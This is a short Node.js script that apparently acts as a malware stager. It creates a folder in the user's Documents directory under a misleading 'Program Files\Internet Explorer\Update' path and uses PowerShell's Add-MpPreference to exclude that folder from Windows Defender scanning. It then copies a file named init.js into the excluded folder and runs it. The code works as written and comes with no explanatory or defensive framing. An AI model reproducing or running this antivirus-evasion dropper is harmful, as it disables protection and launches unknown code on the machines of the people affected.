const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const os = require('os');

// Get current user's home directory
const homeDir = os.homedir();

// Build the directory path dynamically
const dirPath = path.join(homeDir, 'Documents', 'scripts', 'Program Files', 'Internet Explorer', 'Update');

// Create directory if it doesn't exist
try {
    if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, { recursive: true });
    } else {
        console.log(`Directory already exists: ${dirPath}`);
    }
} catch (err) {
    console.error(`Failed to create directory: ${err.message}`);
}

// Add Defender exclusion (requires admin)
const exclusionPath = dirPath;
const psCommand = `Add-MpPreference -ExclusionPath '${exclusionPath}'`;

exec(`powershell -Command "${psCommand}"`, (error, stdout, stderr) => {
    if (error) {
        console.error(`Error adding exclusion: ${error.message}`);
        return;
    }
    if (stderr) {
        console.error(`PowerShell error: ${stderr}`);
        return;
    }
    console.log(`Exclusion added: ${exclusionPath}`);
    
    // Copy init.js to the target directory
    const initSourcePath = path.join(__dirname, 'init.js');
    const initDestPath = path.join(dirPath, 'init.js');
    
    try {
        fs.copyFileSync(initSourcePath, initDestPath);
        console.log(`init.js copied to: ${initDestPath}`);
        
        // Run init.js in the target directory
        exec(`node "${initDestPath}"`, { cwd: dirPath }, (initError, initStdout, initStderr) => {
            if (initError) {
                console.error(`Error running init.js: ${initError.message}`);
                return;
            }
            if (initStderr) {
                console.error(`init.js stderr: ${initStderr}`);
            }
            if (initStdout) {
                console.log(`init.js output: ${initStdout}`);
            }
            console.log('init.js executed successfully');
        });
    } catch (copyError) {
        console.error(`Failed to copy init.js: ${copyError.message}`);
    }
});
